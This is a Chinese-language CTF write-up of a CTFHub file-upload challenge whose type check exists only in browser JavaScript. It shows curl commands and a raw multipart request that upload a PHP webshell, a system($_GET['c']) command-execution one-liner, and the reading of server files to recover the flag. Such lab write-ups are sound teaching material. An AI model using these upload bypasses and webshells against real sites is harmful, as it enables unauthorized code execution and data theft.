# CTFHub Writeup - 前端验证

## 题目类型

WEB

## 题目描述

打开题目，点开链接

里面出现页面标题：CTFHub 文件上传 - js前端验证

标题下方是一个标签 Filename:后面跟着文件选择按钮（选择文件，显示未选择任何文件）

下方一个 Submit 提交按钮

背景是纯白色，没有多余文字、图片，是极简的上传表单

## 漏洞原理

题目把「允许上传的文件类型」这一安全决策完全交给了浏览器端 JavaScript：

function checkfilesuffix()
{
var file = document.getElementsByName('file')[0]['value'];
if (file == "" || file == null) {
alert("请添加上传文件");
return false;
} else {
var whitelist = new Array(".jpg", ".png", ".gif");
var file_suffix = file.substring(file.lastIndexOf("."));
if (whitelist.indexOf(file_suffix) == -1) {
alert("该文件不允许上传");
return false;
}
}
}

这段代码存在两个层面的问题：

1.信任边界错误：

校验逻辑运行在攻击者完全可控的客户端。

攻击者可以禁用 JS、修改 JS、用Burp 改包，或者干脆不用浏览器，直接构造 HTTP 请求，前端校验形同虚设。

2.服务端零校验：

真正接收文件的 index.php 只判断了 $_POST['submit'] 和文件大小，随后直接move_uploaded_file() 落盘

既没有检查扩展名，也没有检查 MIME 和文件内容，还保留了原始文件名。

因此只要绕过浏览器，把 .php 文件 POST 上去，就能得到 WebShell。

## 解题过程

访问首页，拿到的是一个最普通的文件上传表单：

<form action="" method="post" enctype="multipart/form-data"
onsubmit="return checkfilesuffix()">
<label for="file">Filename:</label>
<input type="file" name="file" id="file" />
<br />
<input type="submit" name="submit" value="Submit" />
</form>

直接查看页面源码即可看到内联的 checkfilesuffix()，白名单只有 .jpg、.png、.gif 三种。由于校验
发生在 onsubmit，它只拦截浏览器里的表单提交，对直接发出的 HTTP 请求没有任何约束。

探测上传落点

用 curl 正常提交一次，观察服务端返回：

curl -s -F "file=@shell.php" -F "submit=Submit" \
"http://challenge-5c0c1b11eed507db.sandbox.ctfhub.com:10800/index.php"

响应体开头多出了一段原本没有的内容：

<script>alert('上传成功')</script>上传文件相对路径<br>upload/shell.php

这说明：

上传目录是 upload/，访问 URL 为 /upload/<原始文件名>；

文件名没有被重命名，扩展名原样保留。注意：必须带上 submit=Submit 字段。

服务端逻辑是 if (!empty($_POST['submit']))，缺少该字段时文件根本不会被处理，页面返回与 GET 完全一致（974 字节），很容易误判为「上传失败」。

绕过前端校验

有三种等价思路，本质都是「不让浏览器执行那段 JS」：

Burp Suite：正常选一个 .jpg 提交，在代理里把 filename="x.jpg" 改成
filename="shell.php"，放行；

浏览器控制台：删除/改写 checkfilesuffix，例如 checkfilesuffix = () => true;，或者直接把表
单的 onsubmit 置空；

curl / Python requests：绕开浏览器，直接发 multipart 请求（本文采用的方式）。

因为服务端不做任何类型校验，请求体里的文件名写什么，落盘就是什么。

上传 WebShell

准备一个最小的 PHP 马：

<?php echo "PWNED_OK"; ?>

上传：curl -s -F "file=@shell.php" -F "submit=Submit" \
"http://challenge-5c0c1b11eed507db.sandbox.ctfhub.com:10800/index.php"

访问 /upload/shell.php，页面返回 PWNED_OK，且响应头为 Content-Type: text/html、X-Powered-By: PHP/7.3.14，确认 PHP 解析成功，拿到命令执行入口。

定位并读取 Flag

先列一下 Web 根目录，看看有没有可疑文件：

curl -s -G --data-urlencode "d=/var/www/html" \"http://challenge-5c0c1b11eed507db.sandbox.ctfhub.com:10800/upload/read.php"

结果：

Array
(
[0] => .
[1] => ..
[2] => flag_14804777.php
[3] => index.php
[4] => upload
)

Web 根目录下有一个随机命名的 flag_14804777.php。直接访问它，返回却是空响应（Content-Length: 0）。

原因是这个文件的内容整段都是 PHP 注释，被解释器执行后不产生任何输出：
<?php // ctfhub{fe384f3caa425b17b2b17e25}

所以必须读取文件源码而不能只看执行结果。用上传的读文件脚本读取：

curl -s -G --data-urlencode "p=/var/www/html/flag_14804777.php" \
"http://challenge-5c0c1b11eed507db.sandbox.ctfhub.com:10800/upload/read.php"

回显：
<?php // ctfhub{fe384f3caa425b17b2b17e25}

## 步骤总结

访问首页 → 查看源码发现 JS 白名单

→ 直接构造 multipart POST（带 submit=Submit）
→ 上传 shell.php（服务端不校验扩展名）
→ 访问 /upload/shell.php 执行 PHP
→ 列目录发现 flag_xxxxxxxx.php
→ 读取源码（flag 藏在 PHP 注释里）
→ 得到 flag

关键请求：

POST /index.php HTTP/1.1
Host: challenge-5c0c1b11eed507db.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----X
------X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream
<?php echo "PWNED_OK"; ?>
------X
Content-Disposition: form-data; name="submit"
Submit
------X--

## 踩坑记录

1.响应和首页一模一样：

第一次直接 curl -F 访问根路径，返回 974 字节的原始页面，误以为上传被拦截。

实际上是漏了 submit=Submit，服务端 if (!empty($_POST['submit'])) 不成立，压根没进上传分支。

补上该字段后响应变成 1056 字节，并额外输出「上传成功」和相对路径。

2./upload/ 返回 403：目录存在但关闭了目录浏览，属正常现象，不代表文件不存在；应直接按
「目录 + 原始文件名」访问。

3.Flag 文件直接访问是空的：flag_*.php 的内容是 <?php // ctfhub{...}，整行被注释，HTTP 访问
只得到空响应，必须读源码。

4.扩展名大小写/双后缀：本题服务端完全不校验，shell.php、shell.phtml 均可；shell.php.jpg 这
种双后缀只在「服务端用黑名单 + 取最后一段」的场景才有意义，本题不需要。

5.Windows 本地杀软：

把 <?php system($_GET['c']);?> 落盘时可能被 Defender 隔离，导致 curl
报 read error getting mime data。可改用 -F "file=@-;filename=x.php" 从标准输入喂数据，避
免落盘。

## 总结

这是一道非常典型的「客户端校验」入门题。

核心只有一句话：任何只存在于前端的校验都可以被绕过。

攻击者不需要浏览器，也不需要遵守 JS 的规则；

服务端必须假设所有请求都是恶意的，独立完成类型、内容、落点、执行权限的全部校验。

真正让本题从「上传成功」走到「拿到 flag」的关键，是意识到两点：

一是 submit 字段决定服务端是否处理上传；

二是 flag 文件的内容是 PHP 注释，直接访问为空，必须读源码。
